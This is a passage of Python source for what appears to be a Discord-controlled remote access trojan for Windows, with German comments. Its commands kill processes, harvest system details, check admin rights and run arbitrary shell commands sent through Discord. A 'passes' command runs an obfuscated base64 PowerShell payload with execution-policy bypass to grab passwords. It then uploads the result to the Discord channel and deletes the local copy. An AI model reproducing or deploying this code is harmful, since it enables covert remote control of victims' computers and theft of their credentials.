    # Wenn der Prozess gefunden wurde, sende seine Informationen
    if process_info:
        await ctx.send(f"```\n{process_info}\n```")
    else:
        await ctx.send("Prozess nicht gefunden.")

@bot.command(help="kill a specific process by its PID")
async def taskkill(ctx, pid: int):
    # Befehl zum Beenden des Prozesses mit der angegebenen PID
    result = subprocess.run(['taskkill', '/PID', str(pid)], capture_output=True, text=True, shell=True)

    # Überprüfen, ob der Prozess erfolgreich beendet wurde
    if result.returncode == 0:
        await ctx.send(f"Prozess mit der PID {pid} erfolgreich beendet.")
    else:
        await ctx.send(f"Fehler beim Beenden des Prozesses mit der PID {pid}.")

@bot.command(help= "show some information")
async def tskmngr(ctx):
    # Funktion zur Umrechnung von Bytes in verschiedene Einheiten
    def bytes_to_readable(size_in_bytes):
        suffixes = ['B', 'KB', 'MB', 'GB', 'TB']
        index = 0
        while size_in_bytes >= 1024 and index < len(suffixes) - 1:
            size_in_bytes /= 1024
            index += 1
        return f"{size_in_bytes:.2f} {suffixes[index]}"

    # Systeminformationen
    uname = platform.uname()
    sys_info = (f"System: {uname.system}\n"
                f"Node Name: {uname.node}\n"
                f"Release: {uname.release}\n"
                f"Version: {uname.version}\n"
                f"Machine: {uname.machine}\n"
                f"Processor: {uname.processor}\n\n")

    # CPU-Informationen
    result = subprocess.run(['wmic', 'cpu', 'get', 'Name,Description,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed,CurrentClockSpeed,L2CacheSize,L3CacheSize,SocketDesignation'], capture_output=True, text=True, shell=True)
    cpu_info = result.stdout

    # Speicherinformationen
    result = subprocess.run(['wmic', 'OS', 'get', 'TotalVisibleMemorySize,FreePhysicalMemory'], capture_output=True, text=True, shell=True)
    memory_info_lines = result.stdout.strip().split('\n')  # Entferne Leerzeichen und teile nach Zeilen

    total_memory_mb = 0
    free_memory_mb = 0

    # Extrahiere und summiere die Speicherwerte
    for line in memory_info_lines:
        values = [int(s) for s in line.split() if s.isdigit()]
        if len(values) == 1:
            total_memory_mb += values[0]
        elif len(values) == 2:
            free_memory_mb += values[1]

    # Konvertiere die Speicherwerte in lesbare Einheiten
    total_memory_readable = bytes_to_readable(total_memory_mb * 1024 * 1024)
    free_memory_readable = bytes_to_readable(free_memory_mb * 1024 * 1024)

    # Grafikkarteninformationen
    result = subprocess.run(['wmic', 'path', 'win32_videocontroller', 'get', 'name'], capture_output=True, text=True, shell=True)
    gpu_info = result.stdout

    # Festplatteninformationen
    result = subprocess.run(['wmic', 'diskdrive', 'get', 'caption,size,model'], capture_output=True, text=True, shell=True)
    disk_info = result.stdout

    # Netzwerkinformationen
    result = subprocess.run(['wmic', 'nic', 'get', 'name,speed'], capture_output=True, text=True, shell=True)
    network_info = result.stdout

    # Gesamte Systeminformationen
    full_info = (sys_info +
                 f"Total Memory: {total_memory_readable}\n"
                 f"Free Memory: {free_memory_readable}\n\n" +
                 cpu_info + '\n\n' + gpu_info + '\n\n' + disk_info + '\n\n' + network_info)

    # Nachricht in Teile aufteilen, wenn zu lang
    if len(full_info) > 1900:
        for i in range(0, len(full_info), 1900):
            await ctx.send(f"```\n{full_info[i:i + 1900]}\n```")
    else:
        await ctx.send(f"```\n{full_info}\n```")

@bot.command(help= "check if the program has admin privileges")
async def checkadmin(ctx):
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == True:
        await ctx.send("[*] Congrats you're admin")
    elif is_admin == False:
        await ctx.send("[!] Sorry, you're not admin")

@bot.command(help="grab passwords")
async def passes(ctx):
    import subprocess
    import os
    import discord

    temp = os.getenv('temp')
    if not temp:
        await ctx.send("Temp-Verzeichnis nicht gefunden.")
        return

    def shell(command):
        try:
            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            output = result.stdout.decode('CP437').strip()
            error = result.stderr.decode('CP437').strip()
            if result.returncode != 0:
                return f"Fehler beim Ausführen des Befehls: {error}"
            return output
        except Exception as e:
            return f"Fehler beim Ausführen des Befehls: {e}"

    powershell_command = "Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -EncodedCommand WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA="
    passwords = shell(powershell_command)

    if "Fehler beim Ausführen des Befehls" in passwords:
        await ctx.send(passwords)
        return

    try:
        file_path = os.path.join(temp, "passwords.txt")
        with open(file_path, 'w') as f4:
            f4.write(passwords)

        file = discord.File(file_path, filename="passwords.txt")
        await ctx.send("[*] Command successfully executed", file=file)
    except Exception as e:
        await ctx.send(f"Fehler beim Schreiben oder Senden der Datei: {e}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

@bot.command(help= "run anything like in win+r")
async def winr(ctx, *, command):
    try:
        # Führe den Befehl aus, als wäre er im Win+R-Dialog eingegeben
        subprocess.run(command, shell=True)
        await ctx.send(f'Befehl ausgeführt: {command}')
    except Exception as e:
        await ctx.send(f'Fehler beim Ausführen des Befehls: {e}')


@bot.command(help="Execute a command in the current directory")
async def exec(ctx, *, command):
    global current_directory
    try:
        # Führe den Befehl im aktuellen Verzeichnis aus
        result = subprocess.run(command, cwd=current_directory, shell=True, capture_output=True)
        if result.returncode == 0:
            # Wenn der Befehl erfolgreich war, sende die Ausgabe an den Discord-Channel
            output = result.stdout.decode('utf-8', 'ignore') + result.stderr.decode('utf-8', 'ignore')
            if len(output) == 0:
                await ctx.send("No output.")
            else:
                # Teile die Ausgabe in kleinere Teile auf
                for i in range(0, len(output), 1900):
                    await ctx.send(f'```\n{output[i:i+1900]}\n```')
        else:
            # Wenn der Befehl fehlgeschlagen ist, sende eine entsprechende Nachricht
            await ctx.send(f'Command failed with return code {result.returncode}')
    except Exception as e:
        await ctx.send(f'Error: {e}')

bot.run(TOKEN)
